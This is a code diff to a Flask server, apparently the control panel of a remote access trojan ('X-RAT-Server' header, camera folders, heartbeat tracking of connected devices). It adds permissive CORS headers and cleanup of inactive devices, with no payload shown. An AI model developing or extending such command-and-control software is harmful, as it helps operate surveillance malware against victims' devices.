@@ -23,8 +23,11 @@ app.config['BASE_CAMERA_FOLDER'] = os.path.join(os.path.dirname(os.path.abspath(
 @app.after_request
 def after_request(response):
     response.headers.add('Access-Control-Allow-Origin', '*')
-    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
+    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization,Accept,User-Agent')
     response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
+    response.headers.add('Access-Control-Max-Age', '3600')
+    # Aggiungi header per debug
+    response.headers.add('X-RAT-Server', 'Running')
     return response
 
 # Ensure all folders exist
@@ -1360,6 +1363,21 @@ def download_file(username, filename):
 @login_required
 def list_devices():
     """List all connected devices"""
+    # Aggiorna la lista dei dispositivi prima di mostrarla
+    current_time = int(time.time())
+    with data_lock:
+        # Rimuovi i dispositivi che non hanno fatto heartbeat negli ultimi 5 minuti
+        devices_to_remove = []
+        for device_id, device in devices_data.items():
+            last_seen = device.get('last_seen', 0)
+            if current_time - last_seen > 300:  # 5 minuti
+                devices_to_remove.append(device_id)
+        
+        for device_id in devices_to_remove:
+            print(f"[CLEANUP] Rimozione dispositivo inattivo: {device_id}")
+            append_flask_log("SERVER_EVENTS", f"Dispositivo rimosso per inattività: {device_id}")
+            del devices_data[device_id]
+    
     return render_template('devices.html', devices=devices_data)
 
 @app.route('/device/<device_id>')
